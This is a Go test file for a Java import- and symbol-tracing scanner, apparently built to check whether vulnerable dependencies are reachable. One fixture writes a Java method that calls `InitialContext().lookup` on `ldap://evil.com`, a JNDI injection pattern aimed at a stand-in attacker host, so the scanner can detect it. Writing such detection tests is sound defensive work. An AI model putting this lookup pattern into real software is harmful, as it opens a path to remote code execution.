package java

import (
	"path/filepath"
	"testing"
)

func TestTraceImports_ProductionOnly(t *testing.T) {
	dir := t.TempDir()

	// Production file — should be traced.
	writeFile(t, filepath.Join(dir, "src", "main", "java", "com", "example", "App.java"), `
package com.example;

import org.springframework.web.bind.annotation.RestController;
import com.google.guava.cache.CacheBuilder;

public class App {}
`)

	// Test file — must be excluded.
	writeFile(t, filepath.Join(dir, "src", "test", "java", "com", "example", "AppTest.java"), `
package com.example;

import org.junit.jupiter.api.Test;
import com.google.guava.testing.Foo;

public class AppTest {}
`)

	result, err := TraceImports(dir)
	if err != nil {
		t.Fatal(err)
	}

	// "web" from spring-web and "guava" should be found (from production file).
	if _, ok := result.Imports["web"]; !ok {
		t.Error("expected 'web' (spring) import from production file")
	}
	if _, ok := result.Imports["guava"]; !ok {
		t.Error("expected 'guava' import from production file")
	}
}

func TestTraceImports_TestFilesExcluded(t *testing.T) {
	dir := t.TempDir()

	// Test class naming conventions — should all be excluded.
	for _, name := range []string{"FooTest.java", "FooTests.java", "TestFoo.java", "FooSpec.java", "FooIT.java"} {
		writeFile(t, filepath.Join(dir, "src", "main", name), `
import org.junit.ShouldNotBeIndexed;
public class Foo {}
`)
	}

	result, err := TraceImports(dir)
	if err != nil {
		t.Fatal(err)
	}

	if _, ok := result.Imports["junit"]; ok {
		t.Error("junit should not be indexed — all source files are test files")
	}
}

func TestTraceImports_SrcTestDirExcluded(t *testing.T) {
	dir := t.TempDir()

	writeFile(t, filepath.Join(dir, "src", "test", "java", "com", "App.java"), `
import org.mockito.Mock;
public class App {}
`)

	result, err := TraceImports(dir)
	if err != nil {
		t.Fatal(err)
	}

	if _, ok := result.Imports["mockito"]; ok {
		t.Error("mockito should not be indexed from src/test/")
	}
}

func TestIsImported_ArtifactFound(t *testing.T) {
	result := &ImportResult{
		Imports: map[string][]string{
			"guava": {"/app/src/Foo.java"},
		},
	}

	found, files := result.IsImported("guava")
	if !found {
		t.Error("expected guava to be found")
	}
	if len(files) == 0 {
		t.Error("expected at least one file")
	}
}

func TestIsImported_ArtifactMissing(t *testing.T) {
	result := &ImportResult{Imports: make(map[string][]string)}
	found, _ := result.IsImported("log4j-core")
	if found {
		t.Error("expected log4j-core to be not found")
	}
}

// ── CheckSymbolCall tests ─────────────────────────────────────────────────────

func TestCheckSymbolCall_Found(t *testing.T) {
	dir := t.TempDir()
	src := filepath.Join(dir, "App.java")
	writeFile(t, src, `
package com.example;
import javax.naming.InitialContext;
public class App {
    void vuln() throws Exception {
        new InitialContext().lookup("ldap://evil.com");  // vulnerable
    }
}
`)

	res := CheckSymbolCall(dir, "lookup", []string{src})
	if !res.Found {
		t.Error("expected 'lookup' to be found")
	}
	if res.Evidence == "" {
		t.Error("expected non-empty evidence")
	}
}

func TestCheckSymbolCall_NotFound(t *testing.T) {
	dir := t.TempDir()
	src := filepath.Join(dir, "Safe.java")
	writeFile(t, src, `
package com.example;
public class Safe {
    void safe() { System.out.println("hello"); }
}
`)

	res := CheckSymbolCall(dir, "jndilookup", []string{src})
	if res.Found {
		t.Error("expected no match for jndilookup in safe file")
	}
}
